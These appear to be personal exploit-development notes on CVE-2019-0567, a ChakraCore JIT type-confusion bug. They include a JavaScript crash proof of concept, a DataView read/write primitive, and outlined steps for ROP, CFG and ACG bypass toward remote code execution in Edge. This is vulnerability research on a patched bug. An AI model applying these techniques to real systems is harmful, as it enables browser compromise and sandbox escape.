# CVE-2019-0567:

### Breakpoints

chakracore!Js::DynamicTypeHandler::GetSlot (get slot)

chakracore!Js::DynamicTypeHandler::SetPrototype (setting prototype)

chakracore!Js::DynamicTypeHandler::AdjustSlots (type transition)

ch!WScriptJsrt::EchoCallback (print)

chakracore!Js::DynamicTypeHandler::SetSlotUnchecked (allocation of fields)

chakracore!Js::DataView::EntrySetUint32

### Introduction to ChakraCore

Objects

- Static: strings, bools, ints etc.

- Dynamic: objects

### Some runtime debugging in ChakraCore

We will look at the following code first:

```
let obj = {a:1, b:2}
```

- We will hit `chakracore!Js::DynamicTypeHandler::SetSlotUnchecked` twice, pt and check rcx (should be a pointer). The layout should be as follows

    ```
    vtftable
    type
    inline val
    inline val
    ```

- I am guessing, the first `chakracore!Js::DynamicTypeHandler::SetSlotUnchecked` sets 1 and the second `chakracore!Js::DynamicTypeHandler::SetSlotUnchecked` sets 2

We will look at the following code next:

```
let obj
obj.a = 1
obj.b = 2
obj.c = 3
obj.d = 4
```

- We will hit `chakracore!Js::DynamicTypeHandler::SetSlotUnchecked`, but this time the pointer to our object should look like:

    ```
    vftable
    type
    auxSlots
    ```

    ```
    auxSlots -> 1
             -> 2
             -> 3
             -> 4
    ```

What about the following?

```
let a = {b: 1, c: 2, d: 3, e: 4};
a.f = 5;
```

- Our object will look like:

    ```
    vftable
    type
    auxSlots
    inline vals...
    ```

### Buggy code in ChakraCore

```
function opt(o, proto, value) {
    o.b = 1; // before type transition

    let tmp = {__proto__: proto}; // tmp.prototype = proto
    // forced to go through type transition

    // after type transition

    o.a = value;

    // when i set a to 0x1234, is not auxSlots.a = 0x1234, but 0x1234 becoming the inline value itself
}

function main() {
    for (let i = 0; i < 2000; i++) {
        let o = {a: 1, b: 2};
        opt(o, {}, {}); // mark opt as "hot" by JIT
        // JIT: i have seen opt() been used 2000 with nulls
        // compile opt() into machine code without guard rails
        // o will only be represented as inline values
        // i will not consider if o will go through type transition
    }

    let o = {a: 1, b: 2};

    opt(o, o, 0x1234);

    print(o.a); // cause the crash itself where 0x1234 is invalid memory (auxSlots)
    // when i try to access o.a, i am accessing [0x1234]
}

main();
```

- OP_InitPrototype calls SetPrototype which calls IsPrototype which calls adjustslots

- OP_InitPrototype is executed as machine code, which is proof of JIT compiling opt() to machine code for optimization

- Tl;dr, we will type confuse an object to make it think that it's properties are stored in auxslots when it is actually inlined

### Exploiting buggy code in ChakraCore

- Since we control the confused inline property via `opt(o, o, X);`, we set X as an object (e.g. `opt(o, o, cobj);`), where object can look like:

    ```
    cobj = {}
    cobj.a = 1;
    cobj.b = 2;
    cobj.c = 3;
    cobj.d = 4;
    cobj.e = 5;
    cobj.f = 6;
    cobj.g = 7;
    cobj.h = 8;
    cobj.i = 9;
    cobj.j = 10;
    ```

- Our object chain will look like this

    ```
    victim -> vtable
              type
              cobj    ->   vtable
                      ->   type
                      ->   auxslots  -> 1
                                     -> 2
                                      ...  
    ```

- What if we use something like a Dataview instead?

    ```
    let o = {a: 1, b: 2};
    ...
    opt(o, o, cobj);
    ...
    o.c = dataview1;
    cobj.h = dataview2;
    ```

    ```
               o             cobj

    victim -> vtable
              type
              DataView1 ->  vtable
                        ->  type
                        ->  auxslots -> 1
                                     -> 2
                                      ...  
                                     -> DataView2 (h) -> vtable
    ```

    - We can set it up in a way whereby pointerToDataView2 lands nicely on the backing store of DataView1

    - When we execute DataView1.set(0x10, 0x41414141), what happens is that we can wite 0x41414141 to pointerToDataView2+0x10. What we want to do with this primitive is to use DataView1.set() to write to DataView2's backing store. DataView1 will become to WHERE and DataView2 will become the WHAT

    - We can also relatively read/write the properties of DataView2 or any object we put in cobj.h via DataView1

### RCEing in ChakraCore

- Use DataView1 to read DataView2 vtable to leak chakra.dll, which we can use to get kernel32.dll

- If no CFG, what we can do is that:
    
    1. We can leak the vtable of any JavaScript object via DataView1 (I used Object())

    2. We can craft our own fake virtual function table in the DATA section of chakra.dll which will be populated with stack pivots

    3. Our stack pivot will pivot back into our ROP payload 

    4. Use DataView1 to write to Object's vtable and call the relevant virtual function to pwn!

- If have CFG, we need to do stack leak via a complicated chakra-specific chain

    1. type (below any vtable)

    2. javascriptLibrary
    
    3. scriptContext
    
    4. threadContext
    
    5. leafInterpreterFrame

    6. Stack Leak Pointer

    7. Overwrite RET pointers

### RCEing in Edge Part 1

- Debug CP with the more RAM essentially, the other CP is JIT Server

- Change offsets based on [this](https://bugs.chromium.org/p/project-zero/issues/detail?id=1360) nice article

### RCEing in Edge Part 2

- Edge has ACG, CIG and NCP (no child processes)

- ACG basically restricts RWX code + We cannot map R-X code as R-W vice versa. We also cannot allocate RWX in other processes. Current CP has ACG but the other one does not :)

- CIG says that we cannot execute non-signed DLLs 

- NCP says that we cannot launch processes

- CVE-2017-8637 basically abuses the fact that JIT Servers cannot have ACG enabled. We will abuse this to find the jithandle first via some connectrpc function, call DuplicateHandle() so as to get a handle to the JIT server with full permissions

### RCEing in Edge Part 3

- Write shellcode in ACG-CP

- Write VP ROP in ACG-CP with missing values (to be replaced later via WPM)

    1. Missing value: Location of shellcode in JIT-CP

    2. Missing value: Writeable Address in JIT-CP

- Get full permissions jithandle via DuplicateHandle()

- Create space in JIT-CP using jithandle via VirtualAllocEx()

- Create remote thread in JIT-CP using jithandle via CreateRemoteThread()

- Write missing value #1 in VP ROP in ACG-CP (cause we have the address in JIT-CP already)

- Write missing value #2 in VP ROP in ACG-CP (cause we have the address in JIT-CP already)

- GetThreadContext of remote thread in JIT-CP using threadhandle

- Write Context.RIP with a RET gadget (mapping is strangely the same in both CPs for chakra)

    1. RIP should be pointer to some RtlUserThreadStart since the Thread was created in suspended state

    2. When we g, we should end up in our gadget but we obtain some crash due to CFG (we did a CFG check on the gadget which is not bitmap compatible)

    3. Set RIP to some gadget

- Write Context.RSP with the location of the VP ROP in the JIT-CP

- Set thread context using SetThreadContext

- Resume thread using ResumeThread

### References

[connormcgarr](https://connormcgarr.github.io/type-confusion-part-1/)

[VSC 2017](https://developerinsider.co/download-visual-studio-2017-web-installer-iso-community-professional-enterprise/)

[Microsoft Windows](https://docs.google.com/spreadsheets/u/0/d/14-D4tIlFp9APP0OOvQBRXvfLOYC447UygywenX5LXfo/htmlview?pli=1)

[Types in Chakra](https://abchatra.github.io/Type/)

[NtContinue](http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FThread%2FNtContinue.html)

[JIT Server ACG Bypass](https://msrc.microsoft.com/update-guide/en-us/vulnerability/CVE-2017-8637)

[DuplicateHandle ACG Bypass](https://bugs.chromium.org/p/project-zero/issues/detail?id=1299)

[OpenProcess ACG Bypass](https://bugs.chromium.org/p/project-zero/issues/detail?id=1552)

[leafInterpreterFrame CFG Bypass](https://bugs.chromium.org/p/project-zero/issues/detail?id=1360)

[ESHims CFG Bypass](https://www.blackhat.com/docs/asia-17/materials/asia-17-Li-Cross-The-Wall-Bypass-All-Modern-Mitigations-Of-Microsoft-Edge.pdf)

[RtlCaptureContext CFG Bypass](https://github.com/MortenSchenk/RtlCaptureContext-CFG-Bypass/blob/master/Leaking_Stack.html)

[SEH CFG Bypass](https://blog.improsec.com/tech-blog/back-to-basics-or-bypassing-control-flow-guard-with-structured-exception-handler)

[JIT CFG Bypass](https://blog.theori.io/chakra-jit-cfg-bypass-ff5a88677268)

### Other Edge Case Studies

[Type Confusion CVE-2019-0539](https://perception-point.io/blog/cve-2019-0539-remote-code-execution/)

[UaF CVE-2016-7288](https://blog.quarkslab.com/exploiting-ms16-145-ms-edge-typedarraysort-use-after-free-cve-2016-7288.html)
